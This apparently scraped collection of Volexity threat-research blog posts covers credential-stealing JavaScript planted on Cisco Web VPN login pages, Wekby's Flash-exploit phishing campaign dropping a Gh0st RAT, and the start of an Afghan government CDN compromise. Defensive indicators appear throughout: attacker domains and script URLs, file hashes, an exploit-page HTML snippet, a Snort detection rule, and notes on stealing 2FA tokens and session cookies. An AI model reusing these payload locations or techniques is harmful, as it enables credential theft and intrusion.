<p>The Dukes continue to launch well-crafted and clever attack campaigns. They have had tremendous success evading anti-virus and anti-malware solutions at both the desktop and mail gateway levels. The group&#8217;s anti-VM macros and PowerShell scripts appear to have drastically reduced the number of sandboxes and bots that the group has to deal with on their command and control infrastructure. This combined with their use of steganography to hide their backdoor within PNG files that are downloaded remotely and loaded in memory only or via alternate data streams (ADS) is quite novel in its approach. Volexity believes that the Dukes are likely working to gain long-term access into think tanks and NGOs and will continue to launch new attacks for the foreseeable future.</p>
<p>&nbsp;</p>
<h5>Follow us on Twitter <a href=""https://twitter.com/volexity"">@Volexity</a>, <a href=""http://twitter.com/stevenadair"">@stevenadair</a>, <a href=""http://twitter.com/5ck"">@5ck</a>, <a href=""http://twitter.com/imhlv2"">@imhlv2,</a> <a href=""http://twitter.com/attrc"">@attrc</a></h5>",https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/
Virtual Private Keylogging: Cisco Web VPNs Leveraged for Access and Persistence,"<p>In the world of information security, there is never a dull moment. Part of the fun of working in this space is that you always get to see attackers do something new or put a new spin on something old. Last month at the CERT-EU Conference in Brussels, Belgium, Volexity gave a presentation on a recent evolution in how attackers are maintaining persistence within victim networks. The method, which involves modifying the login pages to Cisco Clientless SSL VPNs (Web VPN), is both novel and surprisingly obvious at the same time. Attackers have been able to successfully implant JavaScript code on the login pages that enables them to surreptitiously steal employee credentials as they login to access internal corporate resources.</p>
<p>Whether you are proactively monitoring your network or reactively undergoing an incident response, one of the last places you might examine for backdoors are your firewalls and VPN gateway appliances. As the industry is learning, firewalls, network devices, and anything else an attacker might be able to gain access to should be scrutinized just as much as any workstation or server within an organization. Having your own devices turned against you can make for a bad week. This represents yet another way attackers are taking credential theft and network persistence to the next level.</p>
<h2><strong>Cisco Clientless SSL VPN (Web VPN)<br />
</strong></h2>
<p>The Cisco Clientless SSL VPN (Web VPN) is a web-based portal that can be enabled on an organization&#8217;s Cisco Adaptive Security Appliance (ASA) devices. The Cisco Web VPN does not require a thick client and is accessed entirely through a web browser by end users. Once a user is authenticated to the Web VPN, based on the permissions the user has, they may be able to access internal web resources, browse internal file shares, and launch plug-ins that allow them to telnet, ssh, or VNC to internal resources. The average user would interface with their organization&#8217;s Cisco Web VPN via a screen similar to the one show in Figure 1 below.</p>
<div class=""wp-caption aligncenter"" id=""attachment_193"" style=""width: 509px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2015/10/cisco-basic-login1.png""><img alt=""cisco-basic-login"" class=""wp-image-193"" height=""372"" src=""http://www.volexity.com/blog/wp-content/uploads/2015/10/cisco-basic-login1.png"" width=""499"" /></a><p class=""wp-caption-text"">Figure 1. Cisco Clientless SSL VPN Login Page</p></div>
<p>&nbsp;</p>
<p>This is certainly not a resource to which you want an attacker to gain access. Unfortunately, Volexity has found that several organizations are silently being victimized through this very login page. This begs the question: <em>How are the attackers managing to pull this off?</em> It turns out it&#8217;s possible through a couple different methods. The first method involves an exploit and the second requires good old fashion administrative access.</p>
<h3>CVE-2014-3393: Security Appliance Turned Security Risk</h3>
<p>Volexity has been able to track its earliest known abuse of Cisco Web VPN login pages back to November 2014. It appears to have started with <a href=""https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3393"">CVE-2014-3393</a>, a vulnerability in, you guessed it, the Cisco Clientless SSL VPN portal. This issue was initially reported by Alec Stuart-Muirk and was covered by Cisco Advisory ID: <a href=""http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa"">cisco-sa-20141008-asa</a> on October 8, 2014. Cisco also released a <a href=""http://blogs.cisco.com/security/cisco-psirt-notice-about-public-exploitation-of-the-cisco-asa-clientless-ssl-vpn-portal-customization-integrity-vulnerability"">notice about public exploitation of the vulnerability</a> on February, 18, 2015. An excerpt from the original advisory describing the vulnerability is shown below.</p>
<blockquote><p>A vulnerability in the Clientless SSL VPN portal customization framework <span style=""text-decoration: underline; color: #0000ff;""><strong>could</strong></span> allow an unauthenticated, remote attacker to modify the content of the Clientless SSL VPN portal, which could lead to several attacks including the stealing of credentials, cross-site scripting (XSS), and other types of web attacks on the client using the affected system.</p>
<p>The vulnerability is due to a improper implementation of authentication checks in the Clientless SSL VPN portal customization framework. An attacker <span style=""text-decoration: underline; color: #0000ff;""><strong>could</strong></span> exploit this vulnerability by modifying some of the customization objects in the RAMFS cache file system. An exploit could allow the attacker to bypass Clientless SSL VPN authentication and modify the portal content.</p></blockquote>
<div class=""wp-caption aligncenter"" id=""attachment_186"" style=""width: 435px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2015/10/lizard-laugh1.jpg""><img alt=""lizard-laugh"" class=""wp-image-186 size-full"" height=""281"" src=""http://www.volexity.com/blog/wp-content/uploads/2015/10/lizard-laugh1.jpg"" width=""425"" /></a><p class=""wp-caption-text"">Figure 2. The lizard that could</p></div>
<p>&nbsp;</p>
<p>Later in the same month at Ruxcon 2014, Stuart-Murik further detailed the Cisco Clientless SSL VPN vulnerability in a presentation titled &#8220;<a href=""https://ruxcon.org.au/assets/2014/slides/Breaking%20Bricks%20Ruxcon%202014.pdf"">Breaking Bricks and Plumbing Pipes: Cisco ASA a Super Mario Adventure</a>&#8220;. Coinciding with his presentation, a <a href=""https://github.com/alec-stuart/BreakingBricks/blob/master/ciscoASA-CED-exploit.rb"">Metasploit module</a> was released that could be leveraged to exploit vulnerable servers.</p>
<h3>Exploitation in the Wild</h3>
<p>While Cisco provided updated software to address the vulnerability, attackers were already off to the races. Vulnerable organizations that were slow to update may have received an unwelcome addition to the source of their <strong>logon.html</strong> file. Figure 3 below shows malicious JavaScript, as seen from the source of an impacted organizations Cisco Web VPN login page.</p>
<div class=""wp-caption aligncenter"" id=""attachment_198"" style=""width: 1908px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2015/10/cisco-initial-script.png""><img alt=""cisco-initial-script"" class=""wp-image-198"" height=""257"" src=""http://www.volexity.com/blog/wp-content/uploads/2015/10/cisco-initial-script.png"" width=""1898"" /></a><p class=""wp-caption-text"">Figure 3. Malicious JavaScript on Cisco Web VPN</p></div>
<p>&nbsp;</p>
<p>While not visible due to URL obfuscation, the file <strong>1.js</strong> was hosted on the compromised website of a legitimate NGO. This website also leveraged a valid SSL certificate, which kept all communications encrypted. The file 1.js was a variant of an online script called &#8220;xss.js&#8221; that was designed to steal form data. Victim organizations effectively had their Cisco Web VPN devices turned into credential collectors for the attackers. This particular round of attacks appears to have compromised several organizations around the globe. Volexity observed this campaign successfully compromising the following verticals:</p>
<ul>
<li>Medical</li>
<li>Think Tank / NGO</li>
<li>University and Academic Institutions</li>
<li>Multi-national Electronics / Manufacturing</li>
</ul>
<p>Volexity also observed a number of other compromises that appear to have occurred later on. In another case, the attackers compromised a different legitimate NGO to host their malicious JavaScript. In that case, Volexity was not able to obtain a copy of the code as it had been taken down already. The table below contains additional details on exploit URLs that Volexity observed being used in the wild to exploit the organization&#8217;s Cisco Web VPNs.</p>
<table border=""0"" cellpadding=""0"" cellspacing=""0"">
<tbody>
<tr>
<td class=""xl64"" height=""15"" width=""350""><strong>URL</strong></td>
<td class=""xl64"" width=""475""><strong>Notes</strong></td>
</tr>
<tr>
<td class=""xl65"" height=""30"">https://103.42.181.84/2/css.js</td>
<td class=""xl66"" width=""454"">This IP no longer appears to host a malicious JavaScript file. The domain <strong><span class=""font5"">cscoelab.com</span></strong><span class=""font0""> previously resolved to the IP address 103.42.181.84. Note: cscoelab.com currently resolves to 43.251.116.175.<br />
</span></td>
</tr>
<tr>
<td class=""xl65"" height=""30"">http://webxss.cn/mu5AOh?1440094244</td>
<td class=""xl66"" width=""454"">webxss.cn has been down in every instance Volexity tried to connect to it. It appears the website likely allowed users to upload and host their own JavaScript. The epoch timestamp appending to the end of URI may indicate the URL was created on August 20, 2015.</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h3>Administratively Compromised</h3>
<p>In several other cases involving breaches to the Cisco Web VPN, it is unclear if an exploit was leveraged or if the attackers actually already had sufficient credentials to directly modify the login page through administrative access. Volexity has worked on several past intrusions where attackers have thoroughly breached an organization and have been able to gain access to security devices, networking equipment, and other critical information technology resources. Attackers are typically able to gain &#8220;legitimate&#8221; access throughout a victim organization&#8217;s environment by installing keyloggers, dumping credentials from systems, exfiltrating documents (spreadsheets) that contain password lists, and identifying passwords that are commonly reused by administrators. Once armed with these credentials, an attacker with access to a victim&#8217;s network can typically perform the same functions as any administrator or highly-privileged individual within the company.</p>
<p>Volexity knows it is 100% possible and surmises it may be likely in some cases that the attackers leveraged credentialed administrative access to a Cisco ASA appliance in order to modify the login page. This can be done via the Cisco Adaptive Security Device Manager (ASDM), a Java administrative interface for Cisco firewalls that can be accessed via a web browser. Access to the devices ASDM should be restricted through access control lists (ACLs) as tightly as possible. At minimum, this is not an interface that should be open to the Internet. Attackers that are able to access this interface by having access to a victim&#8217;s environment or due to an ACL misconfiguration can easily modify code that is loaded via the Cisco Web VPN login page.</p>
<p>Organizations can also examine the settings for the Clientless SSL VPN from within the ASDM to verify that nothing is out of the ordinary. In order verify the Web VPN settings, you must first be logged into the ASDM. Then you can navigate to the following: Remote Access VPN -&gt; Clientless SSL VPN Access -&gt; Portal -&gt; Customization. Once at this screen, you can load the various components of the Portal Page. Below is an example of the default view of the Title Panel settings for the Logon Page. This is the most commonly modified area of the Web VPN that&#8217;s been observed by Volexity thus far.</p>
<div class=""wp-caption aligncenter"" id=""attachment_216"" style=""width: 660px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2015/10/ASDM-Title-Default.png""><img alt=""ASDM-Title-Default"" class=""wp-image-216"" height=""465"" src=""http://www.volexity.com/blog/wp-content/uploads/2015/10/ASDM-Title-Default.png"" width=""650"" /></a><p class=""wp-caption-text"">Figure 4. Cisco Web VPN Customization</p></div>
<p>All an attacker has to do to modify this page to display malicious code is to add JavaScript/HTML anywhere in the text field. It is also possible for an attacker to upload their own JavaScript file to the Cisco Web VPN.</p>
<p>&nbsp;</p>
<h2>Japanese Government and High-Tech Industries Targeted</h2>
<p>One of the most targeted series of attacks that Volexity has observed leveraging these techniques has been against the Japanese Government and High-Tech industries. In these attacks, multiple Japanese organizations were compromised and had their Cisco Web VPN portals modified to load additional JavaScript code. The URL format of the JavaScript code, that was inserted into the source look familiar to some blog readers.</p>
<div class=""wp-caption aligncenter"" id=""attachment_192"" style=""width: 902px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2015/10/cisco-scanbox-js.png""><img alt=""cisco-scanbox-js"" class=""wp-image-192"" height=""176"" src=""http://www.volexity.com/blog/wp-content/uploads/2015/10/cisco-scanbox-js.png"" width=""892"" /></a><p class=""wp-caption-text"">Figure 5. Scanbox on Cisco Web VPN</p></div>
<p>&nbsp;</p>
<p>The JavaScript in these attacks links back to a JavaScript profiling and exploitation framework called <strong>Scanbox</strong>. The framework has been observed in use primary by Chinese APT groups since at least June 2014. Scanbox is often used to gather information about users visiting a compromised site. In particular, by gathering information about a user&#8217;s browser and software installed on the system, the framework can be leveraged to launch attacks against interesting targets and specific vulnerable software. One of Scanbox&#8217;s additional features, capturing keystrokes and cookie data, comes in handy when an employee is attempting to access their Web VPN. The images below are taken from other Scanbox components loaded via <strong>accounts.nttdocomo.mailsecure.cc </strong>later in the redirection chain.</p>
<div class=""wp-caption aligncenter"" id=""attachment_208"" style=""width: 384px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2015/10/scanbox-keylog.png""><img alt=""scanbox-keylog"" class=""wp-image-208"" height=""387"" src=""http://www.volexity.com/blog/wp-content/uploads/2015/10/scanbox-keylog.png"" width=""374"" /></a><p class=""wp-caption-text"">Figure 6. Scanbox Keylogger</p></div>
<p>&nbsp;</p>
<div class=""wp-caption aligncenter"" id=""attachment_209"" style=""width: 495px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2015/10/scanbox-cisco-g.png""><img alt=""scanbox-cisco-g"" class=""wp-image-209"" height=""159"" src=""http://www.volexity.com/blog/wp-content/uploads/2015/10/scanbox-cisco-g.png"" width=""485"" /></a><p class=""wp-caption-text"">Figure 7. Keylog and Cookie Reporting URL</p></div>
<p>&nbsp;</p>
<p>The code shown in Figures 6 and 7 are just a small excerpt of the Scanbox keylogger plugin. Other functions that facilitate building the URI associated with captured keystrokes are not shown. The Scanbox code on the Japanese Government and High-Tech Cisco Web VPNs were being used to record data on users accessing the services. This allowed the attackers to steal credentials in real-time and maintain persistent access to the networks of the victim organizations. Volexity worked with JP-CERT in June of this year to share relevant information on this threat.</p>
<h3>Additional Hostnames and Domains</h3>
<p>Digging into the attacker controlled domain <strong>mailsecure.cc</strong> turns up a few more interesting hosts.</p>
<blockquote><p>account.mhi.co.jp.mailsecure.cc<br />
booking.elinn-kyoto.com.mailsecure.cc<br />
www.jimin.jp.mailsecure.cc</p></blockquote>
<p>Following the theme of accounts.nttdocomo.mailsecure.cc are hostnames of other popular Japanese companies and websites. Volexity did not observe this round of attacks associated with any of the organizations from the subdomain. It appears the attackers are using the names of legitimate Japanese companies and websites in an effort to make the traffic blend in with legitimate traffic. Digging into the e-mail address on the WHOIS registration for mailsecure.cc, <span style=""color: #0000ff;""><strong>westlife678s@hotmail.com</strong></span>, leads to several other domains owned by the attackers.</p>
<table>
<tbody>
<tr>
<td><strong>Domain<br />
</strong></td>
<td><strong>Creation Date<br />
</strong></td>
<td><strong>Expiration Date<br />
</strong></td>
<td><strong>E-mail</strong></td>
</tr>
<tr>
<td>googlecontent.cc</td>
<td>2015-04-21</td>
<td>2016-04-21</td>
<td><a href=""mailto:westlife678s@hotmail.com"">westlife678s@hotmail.com</a></td>
</tr>
<tr>
<td>googleupmail.com</td>
<td>2014-07-31</td>
<td>2015-07-31</td>
<td><a href=""mailto:westlife678s@hotmail.com"">westlife678s@hotmail.com</a></td>
</tr>
<tr>
<td>googleusercontent.cc</td>
<td>2014-12-16</td>
<td>2015-12-16</td>
<td><a href=""mailto:westlife678s@hotmail.com"">westlife678s@hotmail.com</a></td>
</tr>
<tr>
<td>govmailserver.com</td>
<td>2014-11-26</td>
<td>2015-11-26</td>
<td><a href=""mailto:westlife678s@hotmail.com"">westlife678s@hotmail.com</a></td>
</tr>
<tr>
<td>mailsecure.cc</td>
<td>2015-01-19</td>
<td>2016-01-19</td>
<td><a href=""mailto:westlife678s@hotmail.com"">westlife678s@hotmail.com</a></td>
</tr>
<tr>
<td>novartis-it.com</td>
<td>2014-12-16</td>
<td>2015-12-16</td>
<td><a href=""mailto:westlife678s@hotmail.com"">westlife678s@hotmail.com</a></td>
</tr>
<tr>
<td>symantecse.com</td>
<td>2014-12-11</td>
<td>2015-12-11</td>
<td><a href=""mailto:westlife678s@hotmail.com"">westlife678s@hotmail.com</a></td>
</tr>
</tbody>
</table>
<p>Further research into these domains also yields interesting subdomains. A few of the themes appear to look similar to valid Google hosts and others, once again, have a Japanese oriented theme to them.</p>
<blockquote><p>account.googlecontent.cc<br />
accounts.googlecontent.cc<br />
bak.googleupmail.com<br />
docomo.symantecse.com<br />
image.googleusercontent.cc<br />
ja.googleupmail.com<br />
japanese.symantecse.com<br />
jp.googleupmail.com<br />
jp.govmailserver.com<br />
jpa.googleupmail.com<br />
lh4.googleusercontent.cc<br />
mail.googlecontent.cc<br />
secure.symantecse.com<br />
security.symantecse.com<br />
serves.googlecontent.cc<br />
service.googlecontent.cc<br />
service.googleupmail.com<br />
webmail.nira.or.jp.symantecse.com<br />
www.googleupmail.com<br />
www.govmailserver.com</p></blockquote>
<p>Interestingly, Novartis AG filed a complaint about the domain novartis-it.com with the World Intellectual Property Organization (WIPO). In a <a href=""http://www.wipo.int/amc/en/domains/decisions/word/2015/d2015-1250.doc"">decision</a> made on September 7, 2015, it was determined the domain should be transferred to Novartis. As a result, this domain may not be under attacker control for much longer.</p>
<h3>The Malware Connection: PlugX</h3>
<p>Until recently, Volexity did not have the above threat activity tied to specific malware or another known threat group. Several of the above hostnames were leveraging the IP address <strong>255.255.0.0</strong> when parked or not in use. Volexity tracks a threat group that also uses this IP when inactive, but this was not enough to definitively link the two. However, on July 31 and August 18 of this year, multiple hostnames from the aforementioned list and hostnames tied to PlugX malware overlapped on the IP addresses <strong>108.61.222.27</strong> and <strong>104.207.142.124. </strong>The following hostnames, not previously confirmed as connected to the list above, were now on overlapping infrastructure:</p>
<blockquote><p>beservices.googlemanage.com<br />
googleze.googlemanage.com<br />
help.googlemanage.com<br />
help.operaa.net<br />
helpze.operaa.net<br />
microsoft.operaa.net<br />
microsofthy.operaa.net<br />
microsoftno.operaa.net<br />
microsoftoldcl.operaa.net<br />
microsoftze.operaa.net<br />
renkneu.operaa.net<br />
services.googlemanage.com<br />
services.operaa.net<br />
siling.operaa.net<br />
zeservices.googlemanage.com</p></blockquote>
<p>In particular, a public report (<a href=""https://www.circl.lu/pub/tr-24/"">TR-24</a>) from the Computer Incident Response Center Luxembourg (CIRCL) describes a PlugX variant that communicates with <strong>microsoft.operaa.net</strong> and <strong>microsoftno.operaa.net</strong>. Also, previous but now defunct hostnames associated with this threat actor shows an affinity for Novartis. The following hostnames can be found online and in passive DNS:</p>
<blockquote><p>alconnet.eu.novartis.googlemanage.com<br />
phusau-l00310.eu.novartis.operaa.net</p></blockquote>
<p>The list below contains active non-parking IP resolutions and ASN information for this groups various hostnames:</p>
<table>
<tbody>
<tr>
<td></td>
<td><strong>IP Address</strong></td>
<td><strong>ASN Information</strong></td>
</tr>
<tr>
<td></td>
<td>103.243.25.72</td>
<td>133731 | 103.243.24.0/22 | TOINTER-AS | CN | &#8211; | Shanghai Fanyun software Co.LTD</td>
</tr>
<tr>
<td></td>
<td>104.207.142.124</td>
<td>20473 | 104.207.136.0/21 | AS-CHOOPA | US | vultr.com | Vultr Holdings LLC</td>
</tr>
<tr>
<td></td>
<td>157.7.221.152</td>
<td>7506 | 157.7.128.0/17 | INTERQ | JP | gmo.jp | GMO Internet Inc.</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h2>Two-Factor Authentication (2FA)</h2>
<p>An obvious question and concern is whether or not two-factor authentication (2FA) mitigates the risks in the above scenarios. The short answer is <span style=""text-decoration: underline;""><strong>no</strong></span>. Volexity always recommends that organizations of all sizes implement 2FA for all remote network access. This can go a long way to preventing a stolen username and password from giving an attacker keys to the kingdom. However, in this particular scenario, if an attacker is able to load malicious JavaScript through the Cisco Web VPN portal, it would be trivial for them to modify the code to do one of two things:</p>
<ol>
<li><strong>Session Cookie Theft</strong>: The malicious code could be modified to specifically steal session cookies after a user has established an authenticated session. In Volexity&#8217;s testing, it was possible to have two simultaneous Cisco Web VPN sessions using the same session cookies. This means an attacker could leverage the same session as an active legitimate user without either of them being disconnected.</li>
<li><strong>Token Theft and Reuse</strong>: Assuming a user&#8217;s 2FA leverages a numeric token (or similar), an attacker could potentially hijack the user&#8217;s initial authentication attempt and quickly reuse that token to access the victim infrastructure. This would prevent the user from initially logging into their own infrastructure. However, the attacker could then set a cookie to prevent subsequent authentication attempts from being hijacked. Preventing the user from ever authenticating would raise many flags, whereas only interfering with a single login attempt is less likely to result in discovery.</li>
</ol>
<p>Leveraging 2FA on VPNs is a must for organizations. However, it should not be seen as bullet proof. Users are still susceptible to being phished or otherwise having their authentication attempts hijacked. The attackers are fairly ingenious and will likely find a way to gain access, if they are motivated enough.</p>
<h2>Conclusion</h2>
<p>Attackers are continuing to find new ways to use and abuse systems for long term persistent access to networks and systems of interest. This problem is not remotely unique to Cisco Web VPNs. Any other VPN, web server, or appliance that an attacker can gain administrative access to or otherwise customize/modify will potentially present similar risks. As recently made apparent through public disclosures of various backdooring methods, such as <a href=""https://www.fireeye.com/blog/threat-research/2015/09/synful_knock_-_acis.html"">SYNful Knock</a>, no device within a network is off-limits to motivated attackers. When proactively hunting for threat activity on your network and, in particular, when conducting an incident response to an active intrusion, be sure to leave no stone left unturned.</p>",https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/
APT Group Wekby Leveraging Adobe Flash Exploit (CVE-2015-5119),"<p>As if the <a href=""http://www.csoonline.com/article/2943968/data-breach/hacking-team-hacked-attackers-claim-400gb-in-dumped-data.html"">recent breach</a> and subsequent public data dump involving the Italian company Hacking Team wasn&#8217;t bad enough, it all gets just a little bit worse. Emerging from the bowels of Hacking Team data dump was a Flash 0-day exploit (CVE-2015-5119) that was just patched today by Adobe as covered in <a class="""" href=""https://helpx.adobe.com/security/products/flash-player/apsb15-16.html"">APSB15-16</a>. The exploit has since been added into the <a href=""http://malware.dontneedcoffee.com/2015/07/hackingteam-flash-0d-cve-2015-xxxx-and.html"">Angler Exploit Kit</a> and integrated into <a href=""http://www.rapid7.com/db/modules/exploit/multi/browser/adobe_flash_hacking_team_uaf"">Metasploit</a>. However, not to be out done, APT attackers have also started leveraging the exploit in targeted spear phishing attacks as well. Before we start dishing the details, there is going to be one main takeaway from this blog post: If you haven&#8217;t already, update/patch your Adobe Flash <span style=""text-decoration: underline; color: #ff0000;"">now</span>.</p>
<h3>Spear Phishing</h3>
<p>This morning, a well known APT threat group, often referred to as <strong>Wekby,</strong> kicked off a rather ironic spear phishing campaign. The attackers launched spoofed e-mail messages purporting to be from <strong>Adobe</strong>. The e-mail messages references an Adobe Flash update and encourage the recipients to click a link to download and install the update. Take a look at an example of the spear phish e-mail message below.</p>
<p><a href=""http://www.volexity.com/blog/wp-content/uploads/2015/07/wekby-adobe-phish.png""><img alt=""wekby-adobe-phish"" class="" wp-image-159 aligncenter"" height=""449"" src=""http://www.volexity.com/blog/wp-content/uploads/2015/07/wekby-adobe-phish.png"" width=""600"" /></a></p>
<p>The visible and spoofed source e-mail address for &#8220;Andre Vangils&#8221; is <span style=""color: #0000ff;""><strong>avangils@adobe.com</strong></span>. This is not a particularly advanced spear phish message. However, the visible link http://get.adobe.com, as you have likely guessed, does not actually go to Adobe&#8217;s website. Instead it leads to <strong>index.htm</strong> on an IP address belonging to a hosting provider named PEG TECH INC. This page is far less helpful than one would hope. Instead of providing a legitimate Adobe Flash update, the page loads a malicious SWF file instead. The following contents are found from the HTML page from the link:</p>
<blockquote><p>&lt;body&gt;<br />
&lt;div style=&#8221;position:fixed; top:50%; left:50%; width:600; height:400; margin-left:-300; margin-top:-200;&#8221;&gt;<br />
&lt;object classid=&#8221;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000&#8243; id=&#8221;swf&#8221; width=&#8221;600&#8243; height=&#8221;400&#8243;&gt;<br />
&lt;param name=&#8221;movie&#8221; value=&#8221;<span style=""color: #ff0000;""><strong>movie.swf&#8221;</strong></span> /&gt;<br />
&lt;param name=&#8221;allowScriptAccess&#8221; value=&#8221;always&#8221; /&gt;<br />
&lt;embed src=&#8221;movie.swf&#8221; width=&#8221;600&#8243; height=&#8221;400&#8243; allowScriptAccess=&#8221;always&#8221; type=&#8221;application/x-shockwave-flash&#8221; /&gt;<br />
&lt;/object&gt;<br />
&lt;/div&gt;<br />
&lt;/body&gt;<br />
&lt;/html&gt;</p></blockquote>
<p>If you guess this was a Flash exploit, then you are 100% correct.</p>
<h3>Exploits and Malware</h3>
<p>The aforementioned exploit works on Adobe Flash versions all the way up to <strong>18.0.0.194</strong>. You need to have updated your Flash since this morning to be safe from its grips. The attackers appear to have modified one of the exploits that came from the Hacking Team dump. Unlike most of the other versions we have observed up until this point, this SWF file is LZMA compressed and has the ZWS file header. There are plenty of great tools out there that can be used to look at Flash files. One of our favorites is <a href=""http://labs.adobe.com/downloads/swfinvestigator.html"">SWF Investigato</a>r from Adobe. Poking around a bit we can see a few interesting labels that appear to reference Hacking Team, such as the one shown below:</p>
<p>&nbsp;</p>
<p><a href=""http://www.volexity.com/blog/wp-content/uploads/2015/07/ht-framelabel.png""><img alt=""ht-framelabel"" class="" size-full wp-image-161 aligncenter"" height=""356"" src=""http://www.volexity.com/blog/wp-content/uploads/2015/07/ht-framelabel.png"" width=""678"" /></a></p>
<p>Notice the &#8220;HT_exploit&#8221; label. Further down in the file is a class with the same name. These appear to be not so subtle references to the source of this exploit. We did not see these labels or class names in any of the other files we observed thus far, so we presume these were recently created as part of this new exploit file. At the end of the day, the goal of this attack is to install malware on target systems. If a vulnerable system were to visit the exploit site from the spear phish message, this is exactly what would happen. In this case the flash file would drop an executable into the victim user&#8217;s Temp directory similar to the path shown below:</p>
<blockquote><p><strong>C:\Users\$Username\AppData\Local\Temp\Rdws.exe</strong></p></blockquote>
<p>The malware would then execute and immediately start beaconing to the Singapore IP address <strong>223.25.233.248</strong> on TCP<strong> port</strong> 80. This is a well known Wekby command and control (C2) IP address that has been used for years. Currently there a few other active DNS names that resolve to IP such as <strong>gmail.bkz88.com </strong>and <strong>info.imly.org.  </strong>Any connection involving this IP address or these hostnames should be consider hostile and a likely indicator of compromise.</p>
<p>The 223.25.233.248 IP address has served as a C2 server for a variety of different malware in the past (Poison Ivy, Gh0st, Remote RSS, etc.). However, this go around the malware is a modified version of the Gh0st remote access trojan (RAT). Typically the default version of Gh0st sends a packet flag of &#8220;Gh0st&#8221; in the first 5-bytes. This has been heavily modified over the years and several custom versions of Gh0st have emerged with dozens and dozens of customer packet flags such as cb1st, Winds, https, and so on. However, the Wekby APT actor last year started using a modified version that has an 18 character packet flag. This version was reused in this attack and an infected system will send a rather peculiar packet flag as seen in the image below:</p>
<p><a href=""http://www.volexity.com/blog/wp-content/uploads/2015/07/symc-gh0st.png""><img alt=""symc-gh0st"" class="" size-full wp-image-162 aligncenter"" height=""409"" src=""http://www.volexity.com/blog/wp-content/uploads/2015/07/symc-gh0st.png"" width=""534"" /></a></p>
<p>You are reading that correctly, it&#8217;s sending: <strong>HTTP\1.1 Sycmentec.</strong> Presumably this is a poor attempt to blend in as HTTP traffic and appear to be affiliated with Symantec. There are plenty of signatures in the <a href=""https://rules.emergingthreats.net/"">Emerging Threats rulesets</a> to pick up on Gh0st, but you can use the signature below to pickup on this specific instance of Gh0st.</p>
<blockquote><p>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&#8221;Volexity &#8211; Wekby Gh0st Variant [HTTP\1.1 Sycmentec]&#8221;; flow:to_server,established; content:&#8221;HTTP|5c|1.1 Sycmentec&#8221;; depth:18; sid:201507081;)</p></blockquote>
<p>You can add in a check for two null bytes followed by  zlib header (&#8220;|000789c|&#8221;) for an additional match. However, chances are a hit on that string by itself is probably bad news and solid enough. Add a rule for the reverse direction to catch the server&#8217;s response as well.</p>
<p>Also, pretty interesting and funny is what happens is your version of Flash is up-to-date when you visit the exploit page. Instead of silently failing in the background, it instead results in the rather obvious popup:</p>
<p><a href=""http://www.volexity.com/blog/wp-content/uploads/2015/07/faile.png""><img alt=""faile"" class="" size-full wp-image-163 aligncenter"" height=""165"" src=""http://www.volexity.com/blog/wp-content/uploads/2015/07/faile.png"" width=""178"" /></a></p>
<p>Your eyes are not deceiving you. It says <strong>faile! </strong>right on the screen. It looks like the attackers may have left a debug message from their testing. Not very subtle at all.</p>
<h3>File Details and Persistence</h3>
<p>Here&#8217;s what to look for when it comes to file indicators.</p>
<table>
<tbody>
<tr>
<td><strong>Filename</strong></td>
<td>movie.swf</td>
</tr>
<tr>
<td><strong>File size</strong></td>
<td>214976 bytes</td>
</tr>
<tr>
<td><strong>MD5</strong></td>
<td>079a440bee0f86d8a59ebc5c4b523a07</td>
</tr>
<tr>
<td><strong>SHA1</strong></td>
<td>7389e78cca58de6cb2cbe2b631d2fec259e9cdcc</td>
</tr>
<tr>
<td><strong>Notes</strong></td>
<td>Malicious flash file that drops Wekby Gh0st RAT.</td>
</tr>
</tbody>
</table>
<table>
<tbody>
<tr>
<td><strong>Filename</strong></td>
<td>Rdws.exe</td>
</tr>
<tr>
<td><strong>File size</strong></td>
<td>138240 bytes</td>
</tr>
<tr>
<td><strong>MD5</strong></td>
<td>cfbcb83f8515bd169afd0b22488b4430</td>
</tr>
<tr>
<td><strong>SHA1</strong></td>
<td>959638ee177b51bda8701c10258b4956f8b1c367</td>
</tr>
<tr>
<td><strong>Notes</strong></td>
<td>HTTP\1.1 Sycmentec packet flag malware.</td>
</tr>
</tbody>
</table>
<p>The malware sets its persistence adding an entry to the HKCU &#8220;RUN&#8221; key (HKCU\Software\Microsoft\Windows\CurrentVersion\Run):</p>
<blockquote><p><strong>NAME: CSics<br />
DATA: C:\Users\$User\AppData\Local\Rdws.exe</strong></p></blockquote>
<h3>Conclusion</h3>
<p>Volexity is aware of multiple other ongoing APT and non-APT cyber attacks leverage CVE-2015-5119. While it is always important to patch your software and keep it up-to-date, it is <span style=""color: #ff0000;""><strong>CRITICAL</strong></span> that you patch your Adobe Flash immediately. The attackers are having a field day with this exploit and will not slow down any time soon. Patching is the most prudent course of action to deal with this exploit that is very much in the wild. Additionally, as always, for Microsoft Windows users, looking at deploying the <a href=""https://support.microsoft.com/en-us/kb/2458544"">Enhance Mitigation Experience Toolkit (EMET)</a> would also be advised.</p>
<p>&nbsp;</p>
<h5>Follow us on Twitter <a href=""https://twitter.com/volexity"">@Volexity</a>.</h5>",https://www.volexity.com/blog/2015/07/08/158/
Afghan Government Compromise: Browser Beware,"<p>Visiting a wide-ranging number of websites associated with the Government of Afghanistan may yield visitors an unwanted surprise. For the second time this year, malicious code has surfaced on, <span style=""color: #3366ff;""><strong>cdn.afghanistan.af,</strong></span> a host that serves as a content delivery network (CDN) for the Afghan government. Javascript code from this system is found on several different Afghan Offices, Ministries, and Authorities. This strategic web compromise (SWC) against the Afghan CDN server has effectively turned a large portion of the government&#8217;s websites into attack surfaces against visitors. Volexity recently detected malicious code being loaded after a user visited the websites for the <strong>President of Afghanistan</strong> (www.president.gov.af).</p>
<h2><span style=""color: #000000;"">Second Round of Attacks</span></h2>
